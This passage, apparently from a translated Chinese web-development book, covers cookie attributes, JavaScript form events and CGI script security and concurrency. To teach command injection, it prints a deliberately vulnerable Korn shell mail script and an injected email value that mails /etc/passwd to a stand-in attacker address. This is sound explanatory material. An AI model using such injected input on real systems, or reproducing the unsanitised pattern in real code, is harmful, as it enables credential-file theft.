
- 你不仅可以通过域或特定主机来限制 Cookie，还可以指定 Cookie 在哪些路径层次结构下有效。例如，如果你将此属性设置为`/cgi-bin/mystuff`，那么任何运行在`/cgi-bin/mystuff`下的程序都将使用该 Cookie，例如`/cgi-bin/mystuff/game.pl`和`/cgi-bin/mystuff/runme.pl`。然而，尽管`/cgi-bin/send-me-money.pl`位于同一服务器上，它将无法使用你的 Cookie。

### `"secure"`标记（`"secure"` flag）

- 如果设置了此项，除非通过安全通道（如 SSL），否则 Cookie 将不会传回服务器。

## JavaScript

JavaScript 是一种运行在浏览器内部的实用解释语言。它在 Netscape 2 版本中作为“LiveScript”引入，但名称几乎立即更改为 JavaScript，并使其看起来与 Java 相似。在客户端执行代码是非常好的，特别是对于 CGI 目的，因为你可以在客户端进行表单验证等操作，强制让面向用户界面的内容在客户端（它所属的地方）进行处理，而不是在你的服务器上（那里不属于它）。

JavaScript 事件仅在适用情况下可用。以下是 JavaScript 事件列表以及关于何时适用的说明。

### `onBlur`

- 当用户取消选择字段（在另一个区域激活）时触发。适用于：
  - 文本字段
  - 文本区域
  - 密码字段
  - 文件字段
  - 弹出菜单
  - 滚动列表

### `onChange`

- 用户更改了字段的内容。适用于：
  - 文本字段
  - 文本区域
  - 密码字段
  - 文件字段
  - 弹出菜单
  - 滚动列表

### `onClick`

- 鼠标被点击。适用于：
  - 按钮（包括提交、重置和图像按钮）
  - 复选框
  - 单选按钮

### `onFocus`

- 用户选择了此字段。适用于：
  - 文本字段
  - 文本区域
  - 密码字段
  - 文件字段
  - 弹出菜单
  - 滚动列表

### `onLoad`

- 浏览器正在加载当前文档。适用于：
  - 仅限 HTML `<BODY>` 部分。

### `onSelect`

- 用户更改了已选文本字段的部分内容。适用于：
  - 文本字段
  - 文本区域
  - 密码字段
  - 文件字段

### `onSubmit`

- 用户按了表单的提交按钮。JavaScript 在表单实际提交之前执行，因此你可以让 JavaScript 返回值 `false` 来取消提交。适用于：
  - 表单

### `onUnload`

- 浏览器正在关闭当前框架页面。适用于：
  - 仅限 HTML `<BODY>` 部分。

## 总结

通用网关接口（CGI）提供了一种强大且灵活的方式来扩展页面功能。

客户端 CGI 使用 HTML 标签编写，生成的表单用于捕获用户输入并将其传输到服务器端应用程序。服务器端 CGI 将此信息传递给应用程序，向客户端返回更新后的页面和其他信息。

服务器可能需要它。

### 安全与数据并发问题

你必须仔细编写脚本，以防止输入的数据被执行。

列表 18.1 所示的简单 CGI shell 脚本存在严重的安全问题。它是一个非常简单的脚本，执行任务简单。它只是根据用户的电子邮件地址向其发送几行文本。

**列表 18.1：Korn shell 中的简单邮件发送 CGI 脚本**

```ksh
#!/bin/ksh

#

# Listing 18.1 - 向用户发送信息（安全问题）

#

read email_address

mail -s "thanks for caring" $email_address << EOD

Thank you very much for caring about our cause

this letter is just to tell you how much we

really think you are wonderful for caring.

Sincerely,

Jane Doe, Executive Thanker

EOD

exit 0
```

如果用户输入正确的电子邮件地址，一切运行正常。但如果她决定故意刁难，将电子邮件地址输入为`myname@myaddress.com ; mail cracker@hiding.out < /etc/passwd`，那么你的密码文件就会发送到`cracker@hiding.out`。

**注意：** 所有列表均可在 CD-ROM 上找到，格式为`lst18_*nn*.typ*`，其中 nn 是列表编号（01 到 15），typ 是文件类型（htm、ksh、csh 或 txt）。在使用这些示例时，你必须更改 CD-ROM 上的文件名（或将 HTML 代码更改为`lst18_*nn*.typ`名称）。当在服务器上使用这些脚本时，你可能还需要更改 URL。

无论你使用什么种工具来开发 CGI 脚本，这都可能是一个问题。请参见第 19 章“使用 Perl 开发 CGI”，以获取更多关于安全的示例和建议。

通常情况下，当你交互式地运行脚本时，你是该目录中唯一使用它的人（即使它是共享脚本）。但当你有一个 CGI 脚本时，许多人可以在你的目录中并发执行它。你现在不能使用虚拟名称（`temp1`、`temp2` 等）创建临时文件，而是必须确保名称是唯一的。一种良好的技术是使用进程 ID（process id），因为操作系统保证它是唯一的。

此外，在写入或更新文件时必须非常小心。当脚本串行执行（一次一个）时，这很容易。但当它并发执行时，就会出现问题。Shell 脚本并不擅长文件或记录锁定。因此，你必须创建一个工具（如锁定文件的 C 程序），创建用于指示另一个文件已锁定的文件并在完成后删除它们，或者承担更新可能丢失的风险。

有许多表单处理器，它们会将表单内容作为邮件发送给用户，而不是由于文件锁定问题而尝试将用户的输入数据追加到文件中。

### 最小脚本

至少，你的脚本需要向 Web 浏览器返回内容类型（content type），并且应该返回一些有意义的内容（毕竟，执行 CGI 脚本就是为了做某些事情）。

你应该咨询你的本地管理员或 ISP，获取有关在使用 CGI 脚本时具体如何编写 URL 以及将文件放置在何处的更多信息。我使用的 ISP 要求 CGI 脚本放在`public_html`下的`cgi-bin`子目录下。在引用脚本时，只提到了`cgi-bin`目录。
